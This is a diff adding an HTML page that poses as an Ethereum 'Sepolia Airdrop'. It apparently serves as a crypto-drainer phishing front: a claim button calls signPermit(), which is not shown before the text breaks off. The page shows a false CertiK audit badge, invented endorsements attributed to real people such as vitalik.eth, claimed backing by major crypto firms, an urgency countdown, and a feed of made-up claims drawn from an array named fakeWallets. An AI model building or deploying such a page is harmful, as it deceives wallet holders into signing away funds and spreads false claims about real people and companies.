@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Ethereum Sepolia Airdrop</title>
+  <link rel="icon" href="favicon.ico" type="image/x-icon" />
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet"/>
+  <style>
+    body {
+      background-color: #0d1117;
+      color: #c9d1d9;
+      font-family: 'Inter', sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      padding-top: 40px;
+      margin: 0;
+    }
+    h1 { font-size: 1.8rem; margin-bottom: 0.5rem; }
+    #timer { font-size: 1.1rem; color: #58a6ff; margin-bottom: 1rem; }
+    button {
+      padding: 14px 28px;
+      font-size: 1rem;
+      background-color: #238636;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-bottom: 1rem;
+      transition: background 0.3s ease;
+    }
+    button:hover { background-color: #2ea043; }
+    #status { font-size: 0.9rem; color: #8b949e; }
+    .badge, .influencer, .feed, .backers {
+      margin: 15px 0;
+      padding: 10px 16px;
+      background-color: #161b22;
+      border-radius: 8px;
+      border: 1px solid #30363d;
+      width: 90%;
+      max-width: 500px;
+    }
+    .badge { color: #3fb950; font-weight: bold; }
+    .influencer { font-size: 0.85rem; }
+    .feed { font-size: 0.9rem; color: #79c0ff; }
+    .backers img { height: 30px; margin: 0 8px; vertical-align: middle; }
+    .metamask-link {
+      margin-top: 10px;
+      font-size: 0.85rem;
+      color: #58a6ff;
+    }
+    .metamask-link a {
+      color: #58a6ff;
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <h1>Ethereum | Sepolia Airdrop</h1>
+  <div class="badge">✅ Audited by CertiK | Security Verified</div>
+  <div id="timer">Loading countdown...</div>
+  <button onclick="signPermit()">✅ Claim Airdrop</button>
+  <div id="status">Status: Awaiting user action...</div>
+  <div class="metamask-link">📱 Mobile user? <a href="https://metamask.app.link/dapp/cyberarmor.xyz" target="_blank">Open in MetaMask App</a></div>
+  <div class="feed" id="feed">0x1a...d3 just claimed 1000 tokens</div>
+  <div class="influencer">🔹 <b>@chainlinkgod</b>: “This airdrop is 🔥🔥”</div>
+  <div class="influencer">🔹 <b>@vitalik.eth</b>: “Excited about this token’s utility 👀”</div>
+  <div class="influencer">🔹 <b>@sisyphus</b>: “Deployed. Claimed. Respect.”</div>
+  <div class="backers">Backed by:
+    <img src="assets/binance.png" alt="Binance">
+    <img src="assets/aave.png" alt="Aave">
+    <img src="assets/uniswap.png" alt="Uniswap">
+    <img src="assets/solana.png" alt="Solana">
+  </div>
+
+<script>
+const timerElement = document.getElementById("timer");
+let countdown = 3600;
+setInterval(() => {
+  if (countdown > 0) {
+    countdown--;
+    const minutes = String(Math.floor(countdown / 60)).padStart(2, '0');
+    const seconds = String(countdown % 60).padStart(2, '0');
+    timerElement.textContent = `Offer expires in ${minutes}:${seconds}`;
+  } else {
+    timerElement.textContent = "Offer expired!";
+  }
+}, 1000);
+
+const feedElement = document.getElementById("feed");
+const fakeWallets = ["0x3a...9f", "0x7b...e1", "0x99...fc", "0xa2...c8", "0x1f...ae"];
+setInterval(() => {
+  const w = fakeWallets[Math.floor(Math.random() * fakeWallets.length)];
+  feedElement.textContent = `${w} just claimed 1000 tokens`;
+}, 600
